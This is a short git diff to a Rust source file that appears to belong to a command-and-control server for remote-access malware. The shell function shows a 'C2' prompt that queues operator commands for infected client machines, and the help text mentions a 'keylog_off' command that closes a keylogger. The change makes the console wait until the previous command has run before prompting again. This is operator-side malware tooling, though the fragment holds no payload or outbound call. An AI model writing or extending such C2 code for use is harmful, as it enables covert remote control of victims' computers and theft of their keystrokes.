@@ -23,21 +23,26 @@ keylog_off                                      :    To close keylogger and self
     println!("{}", commands);
 }
 
-
 fn shell(ip: String, server_client_manager: &ClientManager){
     println!("To exit the {} shell use 'exit' command", ip);
     let mut cmd = String::new();
     loop {
-        println!("C2 {} => ", ip);
-        io::stdout().flush().unwrap();
+        let cmd_status: Option<String> = server_client_manager.get_command(&ip);
 
-        cmd.clear();
-        io::stdin().read_line(&mut cmd).unwrap();
-        cmd = cmd.trim_end().to_owned();
-        if cmd == "exit" {
-            break
+        // This waits for the command to be executed
+        if cmd_status == None {
+            println!("C2 {} => ", ip);
+            io::stdout().flush().unwrap();
+
+            cmd.clear();
+            io::stdin().read_line(&mut cmd).unwrap();
+            cmd = cmd.trim_end().to_owned();
+            if cmd == "exit" {
+                break
+            }
+            server_client_manager.update_command(&ip, cmd.clone());
         }
-        server_client_manager.update_command(&ip, cmd.clone());
+
         // func - execute command -> takes the command to execute, sends it to the client, and
         // changes the command to None
 
@@ -45,9 +50,7 @@ fn shell(ip: String, server_client_manager: &ClientManager){
     }
 }
 
-
 pub fn commands(cmd: &String, server_client_manager: &ClientManager) {
-
     if cmd == "help" {
         help();
     }
